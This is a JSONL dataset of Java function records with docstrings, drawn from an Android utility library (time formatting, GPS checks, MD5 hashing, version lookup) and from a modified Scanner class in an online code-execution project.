{"docstring": "/**\n * \u68c0\u6d4bGPS\u662f\u5426\u6253\u5f00\n *\n * @param context \u4e0a\u4e0b\u6587\n * @return \u7ed3\u679c\n */\n", "func_signal": "public static boolean isGpsEnabled(Context context)", "code": "{\n    LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);\n    List<String> accessibleProviders = lm.getProviders(true);\n    for (String name : accessibleProviders) {\n        if (\"gps\".equals(name)) {\n            return true;\n        }\n    }\n    return false;\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\NetConnectUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u83b7\u53d6\u5f53\u524d\u65f6\u95f4\u7684\u5e74\u4efd\n *\n * @return \u5e74\u4efd\n */\n", "func_signal": "public static int getYear()", "code": "{\n    Calendar calendar = GregorianCalendar.getInstance();\n    return calendar.get(Calendar.YEAR);\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\TimeUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u83b7\u53d6\u5f53\u524d\u65f6\u95f4\u7684\u6708\u4efd\n *\n * @return \u6708\u4efd\n */\n", "func_signal": "public static int getMonth()", "code": "{\n    Calendar calendar = GregorianCalendar.getInstance();\n    return calendar.get(Calendar.MONTH);\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\TimeUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u628aBitmap\u8f6cByte\n *\n * @param bitmap bitmap\u5bf9\u8c61\n * @return Bytes\n */\n", "func_signal": "public static byte[] bitmap2Bytes(Bitmap bitmap)", "code": "{\n    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n    bitmap.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);\n    return byteArrayOutputStream.toByteArray();\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\AppUtils.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u8df3\u5230\u62e8\u53f7\u76d8-\u62e8\u6253\u7535\u8bdd\n *\n * @param context \u4e0a\u4e0b\u6587\n * @param phone   \u624b\u673a\u53f7\u7801\n */\n", "func_signal": "public static void actionDial(Context context, String phone)", "code": "{\n    Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse(\"tel:\" + phone));\n    intent.setAction(Intent.ACTION_DIAL);// \u62e8\u53f7\u76d8\n    context.startActivity(intent);\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\AppUtils.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u6307\u5b9a\u5c0f\u6570\u8f93\u51fa\n *\n * @param s      \u8f93\u5165\n * @param format \u5c0f\u6570\u683c\u5f0f\uff0c\u6bd4\u5982\u4fdd\u7559\u4e24\u4f4d0.00\n * @return \u8f93\u51fa\u7ed3\u679c\n */\n", "func_signal": "public static String decimalFormat(double s, String format)", "code": "{\n    DecimalFormat decimalFormat = new DecimalFormat(format);\n    return decimalFormat.format(s);\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\AppUtils.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u83b7\u53d6\u5f53\u524d\u65f6\u95f4\u662f\u54ea\u5929\n *\n * @return \u54ea\u5929\n */\n", "func_signal": "public static int getDay()", "code": "{\n    Calendar calendar = GregorianCalendar.getInstance();\n    return calendar.get(Calendar.DATE);\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\TimeUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u65f6\u95f4\u6233\u8f6c\u5317\u4eac\u65f6\u95f4\n *\n * @param millisecond \u5982\"1449455517602\"\n * @param format      \u5982\"yyyy-MM-dd HH:mm:ss\"\n * @return \u683c\u5f0f\u5316\u7ed3\u679c\n */\n", "func_signal": "public static String unixTimestamp2BeijingTime(Object millisecond, String format)", "code": "{\n    SimpleDateFormat simpleDateFormat = new SimpleDateFormat(format, Locale.getDefault());\n    return simpleDateFormat.format(millisecond);\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\TimeUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u5b89\u88c5apk\n *\n * @param context \u4e0a\u4e0b\u6587\n * @param path    \u6587\u4ef6\u8def\u52b2\n */\n", "func_signal": "public static void installAPK(Context context, String path)", "code": "{\n    Intent intent = new Intent();\n    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n    intent.setAction(android.content.Intent.ACTION_VIEW);\n    intent.setDataAndType(Uri.fromFile(new File(path)), \"application/vnd.android.package-archive\");\n    context.startActivity(intent);\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\AppUtils.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u83b7\u53d6\u5f53\u524d\u65f6\u95f4\n *\n * @param format \"yyyy-MM-dd HH:mm:ss\"\n * @return \u5f53\u524d\u65f6\u95f4\n */\n", "func_signal": "public static String getCurrentTime(String format)", "code": "{\n    Date date = new Date();\n    SimpleDateFormat simpleDateFormat = new SimpleDateFormat(format, Locale.getDefault());\n    return simpleDateFormat.format(date);\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\TimeUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u76f4\u63a5\u62e8\u53f7\uff0c\u9700\u8981\u589e\u52a0CALL_PHONE\u6743\u9650\n *\n * @param context \u4e0a\u4e0b\u6587\n * @param phone   \u624b\u673a\u53f7\u7801\n */\n", "func_signal": "public static void actionCall(Context context, String phone)", "code": "{\n    Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse(\"tel:\" + phone));\n    intent.setAction(Intent.ACTION_CALL);// \u76f4\u63a5\u62e8\u53f7\n    context.startActivity(intent);\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\AppUtils.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u83b7\u53d6\u5f53\u524d\u65f6\u95f4\u4e3a\u672c\u6708\u7684\u7b2c\u51e0\u5468\n *\n * @return WeekOfMonth\n */\n", "func_signal": "public static int getWeekOfMonth()", "code": "{\n    Calendar calendar = Calendar.getInstance();\n    int week = calendar.get(Calendar.WEEK_OF_MONTH);\n    return week - 1;\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\TimeUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u6beb\u79d2\u683c\u5f0f\u5316\n * \u4f7f\u7528unixTimestamp2BeijingTime\u65b9\u6cd5\n *\n * @param millisecond \u5982\"1449455517602\"\n * @param format      \u5982\"yyyy-MM-dd HH:mm:ss\"\n * @return \u683c\u5f0f\u5316\u7ed3\u679c\n */\n", "func_signal": "@Deprecated\npublic static String millisecond2String(Object millisecond, String format)", "code": "{\n    SimpleDateFormat simpleDateFormat = new SimpleDateFormat(format, Locale.getDefault());\n    return simpleDateFormat.format(millisecond);\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\TimeUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u83b7\u53d6\u7248\u672ccode\n * \u4e5f\u53ef\u4f7f\u7528 BuildConfig.VERSION_CODE \u66ff\u6362\n *\n * @param context \u4e0a\u4e0b\u6587\n * @return \u7248\u672ccode\n */\n", "func_signal": "public static int getVersionCode(Context context)", "code": "{\n    PackageManager packageManager = context.getPackageManager();\n    String packageName = context.getPackageName();\n    try {\n        PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 0);\n        return packageInfo.versionCode;\n    } catch (PackageManager.NameNotFoundException e) {\n        e.printStackTrace();\n    }\n    return 1;\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\VersionUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * MD5\u52a0\u5bc6\n *\n * @param plainText \u9700\u8981\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\n * @return \u52a0\u5bc6\u540e\u5b57\u7b26\u4e32\n */\n", "func_signal": "public static String md5(String plainText)", "code": "{\n    String result = \"\";\n    try {\n        MessageDigest md = MessageDigest.getInstance(\"MD5\");\n        md.update(plainText.getBytes());\n        byte b[] = md.digest();\n\n        int i;\n\n        StringBuffer buf = new StringBuffer(\"\");\n        for (int offset = 0; offset < b.length; offset++) {\n            i = b[offset];\n            if (i < 0)\n                i += 256;\n            if (i < 16)\n                buf.append(\"0\");\n            buf.append(Integer.toHexString(i));\n        }\n        result = buf.toString().toLowerCase();// 32\u4f4d\u7684\u52a0\u5bc6\uff08\u8f6c\u6210\u5c0f\u5199\uff09\n\n        buf.toString().substring(8, 24);// 16\u4f4d\u7684\u52a0\u5bc6\n\n    } catch (NoSuchAlgorithmException e) {\n        e.printStackTrace();\n    }\n    return result;\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\AppUtils.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u83b7\u53d6\u5f53\u524d\u65f6\u95f4\u4e3a\u672c\u5468\u7684\u7b2c\u51e0\u5929\n *\n * @return DayOfWeek\n */\n", "func_signal": "public static int getDayOfWeek()", "code": "{\n    Calendar calendar = Calendar.getInstance();\n    int day = calendar.get(Calendar.DAY_OF_WEEK);\n    if (day == 1) {\n        day = 7;\n    } else {\n        day = day - 1;\n    }\n    return day;\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\TimeUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u65f6\u95f4\u6bd4\u8f83\u5927\u5c0f\n *\n * @param date1 date1\n * @param date2 date2\n * @param format \"yyyy-MM-dd HH:mm:ss\"\n * @return 1:date1\u5927\u4e8edate2\uff1b\n * -1:date1\u5c0f\u4e8edate2\n */\n", "func_signal": "public static int compareDate(String date1, String date2, String format)", "code": "{\n    DateFormat df = new SimpleDateFormat(format, Locale.getDefault());\n    try {\n        Date dt1 = df.parse(date1);\n        Date dt2 = df.parse(date2);\n        if (dt1.getTime() > dt2.getTime()) {\n            return 1;\n        } else if (dt1.getTime() < dt2.getTime()) {\n            return -1;\n        } else {\n            return 0;\n        }\n    } catch (Exception exception) {\n        exception.printStackTrace();\n    }\n    return 0;\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\TimeUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u5173\u95ed\u952e\u76d8\n *\n * @param activity Activity\n */\n", "func_signal": "public static void hideSoftInput(Activity activity)", "code": "{\n    if (activity.getCurrentFocus() != null)\n        ((InputMethodManager) activity\n                .getSystemService(Context.INPUT_METHOD_SERVICE))\n                .hideSoftInputFromWindow(activity.getCurrentFocus()\n                        .getWindowToken(), InputMethodManager.HIDE_NOT_ALWAYS);\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\AppUtils.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u5317\u4eac\u65f6\u95f4\u8f6c\u65f6\u95f4\u6233\n * \u6ce8\u610f\u7b2c\u4e00\u4e2a\u53c2\u6570\u548c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u683c\u5f0f\u5fc5\u987b\u4e00\u6837\n *\n * @param beijingTime \u5982\"2016-6-26 20:35:9\"\n * @param format      \u5982\"yyyy-MM-dd HH:mm:ss\"\n * @return \u65f6\u95f4\u6233\n */\n", "func_signal": "public static long beijingTime2UnixTimestamp(String beijingTime, String format)", "code": "{\n    SimpleDateFormat simpleDateFormat = new SimpleDateFormat(format, Locale.getDefault());\n    long unixTimestamp = 0;\n    try {\n        Date date = simpleDateFormat.parse(beijingTime);\n        unixTimestamp = date.getTime() / 1000;\n    } catch (ParseException e) {\n        e.printStackTrace();\n    }\n    return unixTimestamp;\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\TimeUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * \u83b7\u53d6\u7248\u672c\u53f7\n * \u4e5f\u53ef\u4f7f\u7528 BuildConfig.VERSION_NAME \u66ff\u6362\n *\n * @param context \u4e0a\u4e0b\u6587\n * @return \u7248\u672c\u53f7\n */\n", "func_signal": "public static String getVersionName(Context context)", "code": "{\n    PackageManager packageManager = context.getPackageManager();\n    String packageName = context.getPackageName();\n    try {\n        PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 0);\n        return packageInfo.versionName;\n    } catch (PackageManager.NameNotFoundException e) {\n        e.printStackTrace();\n    }\n    return \"1.0.0\";\n}", "path": "library\\src\\main\\java\\com\\wuxiaolong\\androidutils\\library\\VersionUtil.java", "repo_name": "WuXiaolong/AndroidUtils", "stars": 601, "license": "None", "language": "java", "size": 170}
{"docstring": "/**\n * Attempts to find the next occurrence of the specified pattern ignoring\n * delimiters. If the pattern is found before the next line separator, the\n * scanner advances past the input that matched and returns the string that\n * matched the pattern.\n * If no such pattern is detected in the input up to the next line\n * separator, then <code>null</code> is returned and the scanner's\n * position is unchanged. This method may block waiting for input that\n * matches the pattern.\n *\n * <p>Since this method continues to search through the input looking\n * for the specified pattern, it may buffer all of the input searching for\n * the desired token if no line separators are present.\n *\n * @param pattern the pattern to scan for\n * @return the text that matched the specified pattern\n * @throws IllegalStateException if this scanner is closed\n */\n", "func_signal": "public String findInLine(Pattern pattern)", "code": "{\n    ensureOpen();\n    if (pattern == null)\n        throw new NullPointerException();\n    clearCaches();\n    // Expand buffer to include the next newline or end of input\n    int endPosition = 0;\n    saveState();\n    while (true) {\n        String token = findPatternInBuffer(separatorPattern(), 0);\n        if (token != null) {\n            endPosition = matcher.start();\n            break; // up to next newline\n        }\n        if (needInput) {\n            readInput();\n        } else {\n            endPosition = buf.limit();\n            break; // up to end of input\n        }\n    }\n    revertState();\n    int horizonForLine = endPosition - position;\n    // If there is nothing between the current pos and the next\n    // newline simply return null, invoking findWithinHorizon\n    // with \"horizon=0\" will scan beyond the line bound.\n    if (horizonForLine == 0)\n        return null;\n    // Search for the pattern\n    return findWithinHorizon(pattern, horizonForLine);\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Scans the next token of the input as a <tt>float</tt>.\n * This method will throw <code>InputMismatchException</code>\n * if the next token cannot be translated into a valid float value as\n * described below. If the translation is successful, the scanner advances\n * past the input that matched.\n *\n * <p> If the next token matches the <a\n * href=\"#Float-regex\"><i>Float</i></a> regular expression defined above\n * then the token is converted into a <tt>float</tt> value as if by\n * removing all locale specific prefixes, group separators, and locale\n * specific suffixes, then mapping non-ASCII digits into ASCII\n * digits via {@link Character#digit Character.digit}, prepending a\n * negative sign (-) if the locale specific negative prefixes and suffixes\n * were present, and passing the resulting string to\n * {@link Float#parseFloat Float.parseFloat}. If the token matches\n * the localized NaN or infinity strings, then either \"Nan\" or \"Infinity\"\n * is passed to {@link Float#parseFloat(String) Float.parseFloat} as\n * appropriate.\n *\n * @return the <tt>float</tt> scanned from the input\n * @throws InputMismatchException\n *         if the next token does not match the <i>Float</i>\n *         regular expression, or is out of range\n * @throws NoSuchElementException if input is exhausted\n * @throws IllegalStateException if this scanner is closed\n */\n", "func_signal": "public float nextFloat()", "code": "{\n    // Check cached result\n    if ((typeCache != null) && (typeCache instanceof Float)) {\n        float val = ((Float)typeCache).floatValue();\n        useTypeCache();\n        return val;\n    }\n    setRadix(10);\n    clearCaches();\n    try {\n        return Float.parseFloat(processFloatToken(next(floatPattern())));\n    } catch (NumberFormatException nfe) {\n        position = matcher.start(); // don't skip bad token\n        throw new InputMismatchException(nfe.getMessage());\n    }\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Sets this scanner's default radix to the specified radix.\n *\n * <p>A scanner's radix affects elements of its default\n * number matching regular expressions; see\n * <a href= \"#localized-numbers\">localized numbers</a> above.\n *\n * <p>If the radix is less than <code>Character.MIN_RADIX</code>\n * or greater than <code>Character.MAX_RADIX</code>, then an\n * <code>IllegalArgumentException</code> is thrown.\n *\n * <p>Invoking the {@link #reset} method will set the scanner's radix to\n * <code>10</code>.\n *\n * @param radix The radix to use when scanning numbers\n * @return this scanner\n * @throws IllegalArgumentException if radix is out of range\n */\n", "func_signal": "public org.olexec.execute.HackScanner useRadix(int radix)", "code": "{\n    if ((radix < Character.MIN_RADIX) || (radix > Character.MAX_RADIX))\n        throw new IllegalArgumentException(\"radix:\"+radix);\n\n    if (this.defaultRadix == radix)\n        return this;\n    this.defaultRadix = radix;\n    // Force rebuilding and recompilation of radix dependent patterns\n    integerPattern = null;\n    return this;\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Scans the next token of the input as a <tt>byte</tt>.\n * This method will throw <code>InputMismatchException</code>\n * if the next token cannot be translated into a valid byte value as\n * described below. If the translation is successful, the scanner advances\n * past the input that matched.\n *\n * <p> If the next token matches the <a\n * href=\"#Integer-regex\"><i>Integer</i></a> regular expression defined\n * above then the token is converted into a <tt>byte</tt> value as if by\n * removing all locale specific prefixes, group separators, and locale\n * specific suffixes, then mapping non-ASCII digits into ASCII\n * digits via {@link Character#digit Character.digit}, prepending a\n * negative sign (-) if the locale specific negative prefixes and suffixes\n * were present, and passing the resulting string to\n * {@link Byte#parseByte(String, int) Byte.parseByte} with the\n * specified radix.\n *\n * @param radix the radix used to interpret the token as a byte value\n * @return the <tt>byte</tt> scanned from the input\n * @throws InputMismatchException\n *         if the next token does not match the <i>Integer</i>\n *         regular expression, or is out of range\n * @throws NoSuchElementException if input is exhausted\n * @throws IllegalStateException if this scanner is closed\n */\n", "func_signal": "public byte nextByte(int radix)", "code": "{\n    // Check cached result\n    if ((typeCache != null) && (typeCache instanceof Byte)\n            && this.radix == radix) {\n        byte val = ((Byte)typeCache).byteValue();\n        useTypeCache();\n        return val;\n    }\n    setRadix(radix);\n    clearCaches();\n    // Search for next byte\n    try {\n        String s = next(integerPattern());\n        if (matcher.group(SIMPLE_GROUP_INDEX) == null)\n            s = processIntegerToken(s);\n        return Byte.parseByte(s, radix);\n    } catch (NumberFormatException nfe) {\n        position = matcher.start(); // don't skip bad token\n        throw new InputMismatchException(nfe.getMessage());\n    }\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Returns true if the next token in this scanner's input can be\n * interpreted as a short value in the specified radix using the\n * {@link #nextShort} method. The scanner does not advance past any input.\n *\n * @param radix the radix used to interpret the token as a short value\n * @return true if and only if this scanner's next token is a valid\n *         short value in the specified radix\n * @throws IllegalStateException if this scanner is closed\n */\n", "func_signal": "public boolean hasNextShort(int radix)", "code": "{\n    setRadix(radix);\n    boolean result = hasNext(integerPattern());\n    if (result) { // Cache it\n        try {\n            String s = (matcher.group(SIMPLE_GROUP_INDEX) == null) ?\n                    processIntegerToken(hasNextResult) :\n                    hasNextResult;\n            typeCache = Short.parseShort(s, radix);\n        } catch (NumberFormatException nfe) {\n            result = false;\n        }\n    }\n    return result;\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Sets this scanner's locale to the specified locale.\n *\n * <p>A scanner's locale affects many elements of its default\n * primitive matching regular expressions; see\n * <a href= \"#localized-numbers\">localized numbers</a> above.\n *\n * <p>Invoking the {@link #reset} method will set the scanner's locale to\n * the <a href= \"#initial-locale\">initial locale</a>.\n *\n * @param locale A string specifying the locale to use\n * @return this scanner\n */\n", "func_signal": "public org.olexec.execute.HackScanner useLocale(Locale locale)", "code": "{\n    if (locale.equals(this.locale))\n        return this;\n\n    this.locale = locale;\n    DecimalFormat df =\n            (DecimalFormat)NumberFormat.getNumberInstance(locale);\n    DecimalFormatSymbols dfs = DecimalFormatSymbols.getInstance(locale);\n\n    // These must be literalized to avoid collision with regex\n    // metacharacters such as dot or parenthesis\n    groupSeparator =   \"\\\\\" + dfs.getGroupingSeparator();\n    decimalSeparator = \"\\\\\" + dfs.getDecimalSeparator();\n\n    // Quoting the nonzero length locale-specific things\n    // to avoid potential conflict with metacharacters\n    nanString = \"\\\\Q\" + dfs.getNaN() + \"\\\\E\";\n    infinityString = \"\\\\Q\" + dfs.getInfinity() + \"\\\\E\";\n    positivePrefix = df.getPositivePrefix();\n    if (positivePrefix.length() > 0)\n        positivePrefix = \"\\\\Q\" + positivePrefix + \"\\\\E\";\n    negativePrefix = df.getNegativePrefix();\n    if (negativePrefix.length() > 0)\n        negativePrefix = \"\\\\Q\" + negativePrefix + \"\\\\E\";\n    positiveSuffix = df.getPositiveSuffix();\n    if (positiveSuffix.length() > 0)\n        positiveSuffix = \"\\\\Q\" + positiveSuffix + \"\\\\E\";\n    negativeSuffix = df.getNegativeSuffix();\n    if (negativeSuffix.length() > 0)\n        negativeSuffix = \"\\\\Q\" + negativeSuffix + \"\\\\E\";\n\n    // Force rebuilding and recompilation of locale dependent\n    // primitive patterns\n    integerPattern = null;\n    floatPattern = null;\n\n    return this;\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "// Tries to read more input. May block.\n", "func_signal": "private void readInput()", "code": "{\n    if (buf.limit() == buf.capacity())\n        makeSpace();\n\n    // Prepare to receive data\n    int p = buf.position();\n    buf.position(buf.limit());\n    buf.limit(buf.capacity());\n\n    int n = 0;\n    try {\n        n = source.read(buf);\n    } catch (IOException ioe) {\n        lastException = ioe;\n        n = -1;\n    }\n\n    if (n == -1) {\n        sourceClosed = true;\n        needInput = false;\n    }\n\n    if (n > 0)\n        needInput = false;\n\n    // Restore current position and limit for reading\n    buf.limit(buf.position());\n    buf.position(p);\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Sets this scanner's delimiting pattern to a pattern constructed from\n * the specified <code>String</code>.\n *\n * <p> An invocation of this method of the form\n * <tt>useDelimiter(pattern)</tt> behaves in exactly the same way as the\n * invocation <tt>useDelimiter(Pattern.compile(pattern))</tt>.\n *\n * <p> Invoking the {@link #reset} method will set the scanner's delimiter\n * to the <a href= \"#default-delimiter\">default</a>.\n *\n * @param pattern A string specifying a delimiting pattern\n * @return this scanner\n */\n", "func_signal": "public org.olexec.execute.HackScanner useDelimiter(String pattern)", "code": "{\n    delimPattern = patternCache.forName(pattern);\n    return this;\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Finds and returns the next complete token from this scanner.\n * A complete token is preceded and followed by input that matches\n * the delimiter pattern. This method may block while waiting for input\n * to scan, even if a previous invocation of {@link #hasNext} returned\n * <code>true</code>.\n *\n * @return the next token\n * @throws NoSuchElementException if no more tokens are available\n * @throws IllegalStateException if this scanner is closed\n * @see java.util.Iterator\n */\n", "func_signal": "public String next()", "code": "{\n    ensureOpen();\n    clearCaches();\n\n    while (true) {\n        String token = getCompleteTokenInBuffer(null);\n        if (token != null) {\n            matchValid = true;\n            skipped = false;\n            return token;\n        }\n        if (needInput)\n            readInput();\n        else\n            throwFor();\n    }\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Scans the next token of the input as a {@link java.math.BigInteger\n * BigInteger}.\n *\n * <p> If the next token matches the <a\n * href=\"#Integer-regex\"><i>Integer</i></a> regular expression defined\n * above then the token is converted into a <tt>BigInteger</tt> value as if\n * by removing all group separators, mapping non-ASCII digits into ASCII\n * digits via the {@link Character#digit Character.digit}, and passing the\n * resulting string to the {@link\n * java.math.BigInteger#BigInteger(java.lang.String)\n * BigInteger(String, int)} constructor with the specified radix.\n *\n * @param radix the radix used to interpret the token\n * @return the <tt>BigInteger</tt> scanned from the input\n * @throws InputMismatchException\n *         if the next token does not match the <i>Integer</i>\n *         regular expression, or is out of range\n * @throws NoSuchElementException if the input is exhausted\n * @throws IllegalStateException if this scanner is closed\n */\n", "func_signal": "public BigInteger nextBigInteger(int radix)", "code": "{\n    // Check cached result\n    if ((typeCache != null) && (typeCache instanceof BigInteger)\n            && this.radix == radix) {\n        BigInteger val = (BigInteger)typeCache;\n        useTypeCache();\n        return val;\n    }\n    setRadix(radix);\n    clearCaches();\n    // Search for next int\n    try {\n        String s = next(integerPattern());\n        if (matcher.group(SIMPLE_GROUP_INDEX) == null)\n            s = processIntegerToken(s);\n        return new BigInteger(s, radix);\n    } catch (NumberFormatException nfe) {\n        position = matcher.start(); // don't skip bad token\n        throw new InputMismatchException(nfe.getMessage());\n    }\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Returns true if the next token in this scanner's input can be\n * interpreted as a float value using the {@link #nextFloat}\n * method. The scanner does not advance past any input.\n *\n * @return true if and only if this scanner's next token is a valid\n *         float value\n * @throws IllegalStateException if this scanner is closed\n */\n", "func_signal": "public boolean hasNextFloat()", "code": "{\n    setRadix(10);\n    boolean result = hasNext(floatPattern());\n    if (result) { // Cache it\n        try {\n            String s = processFloatToken(hasNextResult);\n            typeCache = Float.valueOf(Float.parseFloat(s));\n        } catch (NumberFormatException nfe) {\n            result = false;\n        }\n    }\n    return result;\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Returns true if this scanner has another token in its input.\n * This method may block while waiting for input to scan.\n * The scanner does not advance past any input.\n *\n * @return true if and only if this scanner has another token\n * @throws IllegalStateException if this scanner is closed\n * @see java.util.Iterator\n */\n", "func_signal": "public boolean hasNext()", "code": "{\n    ensureOpen();\n    saveState();\n    while (!sourceClosed) {\n        if (hasTokenInBuffer())\n            return revertState(true);\n        readInput();\n    }\n    boolean result = hasTokenInBuffer();\n    return revertState(result);\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "/**\n * Returns true if the next token in this scanner's input can be\n * interpreted as a <code>BigDecimal</code> using the\n * {@link #nextBigDecimal} method. The scanner does not advance past any\n * input.\n *\n * @return true if and only if this scanner's next token is a valid\n *         <code>BigDecimal</code>\n * @throws IllegalStateException if this scanner is closed\n */\n", "func_signal": "public boolean hasNextBigDecimal()", "code": "{\n    setRadix(10);\n    boolean result = hasNext(decimalPattern());\n    if (result) { // Cache it\n        try {\n            String s = processFloatToken(hasNextResult);\n            typeCache = new BigDecimal(s);\n        } catch (NumberFormatException nfe) {\n            result = false;\n        }\n    }\n    return result;\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "// Clears both regular cache and type cache\n", "func_signal": "private void clearCaches()", "code": "{\n    hasNextPattern = null;\n    typeCache = null;\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
{"docstring": "// When a buffer compaction/reallocation occurs the saved indexes must\n// be modified appropriately\n", "func_signal": "private void translateSavedIndexes(int offset)", "code": "{\n    if (savedScannerPosition != -1)\n        savedScannerPosition -= offset;\n}", "path": "src\\main\\java\\org\\olexec\\execute\\HackScanner.java", "repo_name": "TangBean/OnlineExecutor", "stars": 610, "license": "None", "language": "java", "size": 733}
